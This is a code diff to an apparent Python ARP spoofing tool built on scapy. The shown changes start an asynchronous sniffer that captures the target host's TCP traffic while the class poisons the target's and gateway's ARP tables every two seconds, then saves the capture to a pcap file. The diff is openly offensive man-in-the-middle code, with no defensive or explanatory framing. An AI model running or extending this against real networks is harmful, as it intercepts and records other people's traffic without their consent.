@@ -1,4 +1,5 @@
 import scapy.all as scapy
+import scapy.sendrecv
 from cSubprocess import *
 from networking import *
 import time 
@@ -50,8 +51,9 @@ class ArpSpoofer:
     # Method to spoof ARP tables for target and gateway devices
     def spoof(self, gateway_ip, target_ip):
         try:
-            # target_filter = "host " + target_ip + " and tcp"
-            # capture = scapy.sniff(iface="eth0", filter=target_filter)
+            target_filter = "host " + target_ip + " and tcp"
+            capture_device = scapy.sendrecv.AsyncSniffer(iface="eth0", filter=target_filter)
+            capture_device.start()
             while True:
                 target_mac = get_mac_address(target_ip)
                 gateway_mac = get_mac_address(gateway_ip)
@@ -75,5 +77,6 @@ class ArpSpoofer:
 
                 time.sleep(2) # Resend packets every 2 seconds (changing might affect spoofing effectiveness)
         except KeyboardInterrupt:
+            capture = capture_device.stop()
             scapy.wrpcap("packet_log.pcap", capture) # Log capture to a file
             self.cleanup(gateway_ip, target_ip) # Restore ARP tables and remove the MITM position
